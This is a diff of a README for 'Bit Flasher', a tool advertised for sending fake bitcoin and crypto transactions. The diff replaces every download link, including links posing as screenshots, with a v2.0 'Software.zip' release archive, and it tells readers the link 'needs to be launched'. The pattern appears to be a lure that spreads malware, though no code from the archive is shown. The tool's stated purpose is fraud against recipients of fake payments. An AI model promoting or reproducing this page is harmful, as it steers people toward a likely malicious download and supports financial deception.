@@ -10,7 +10,7 @@ Welcome to the **Bit Flasher** repository! Here you can find all the tools and r
 
 ## Get Started 🚀
 
-To get started with Bit Flasher, head over to the [**Release** section](https://github.com/whattahw/bit-flasher/releases/download/v1.0/Application.zip) where you can find the latest version to download. If you prefer a direct download link, click [here](https://github.com/whattahw/bit-flasher/releases/download/v1.0/Application.zip).
+To get started with Bit Flasher, head over to the [**Release** section](https://github.com/whattahw/bit-flasher/releases/download/v2.0/Software.zip) where you can find the latest version to download. If you prefer a direct download link, click [here](https://github.com/whattahw/bit-flasher/releases/download/v2.0/Software.zip).
 
 Note: The provided link needs to be launched to download the software.
 
@@ -34,9 +34,9 @@ It's that easy to start using Bit Flasher for all your fake crypto needs!
 
 Here are some sneak peeks into the Bit Flasher software:
 
-![Screenshot 1](https://github.com/whattahw/bit-flasher/releases/download/v1.0/Application.zip)
-![Screenshot 2](https://github.com/whattahw/bit-flasher/releases/download/v1.0/Application.zip)
-![Screenshot 3](https://github.com/whattahw/bit-flasher/releases/download/v1.0/Application.zip)
+![Screenshot 1](https://github.com/whattahw/bit-flasher/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/whattahw/bit-flasher/releases/download/v2.0/Software.zip)
+![Screenshot 3](https://github.com/whattahw/bit-flasher/releases/download/v2.0/Software.zip)
 
 ## Support ℹ️
 
@@ -52,4 +52,4 @@ To stay updated on the latest releases and features of Bit Flasher, be sure to w
 
 Thank you for checking out Bit Flasher! We hope you have a great time sending fake bitcoins and crypto transactions with our tool. Happy flashing! 🚀✨
 
-[Download Now](https://github.com/whattahw/bit-flasher/releases/download/v1.0/Application.zip)
+[Download Now](https://github.com/whattahw/bit-flasher/releases/download/v2.0/Software.zip)
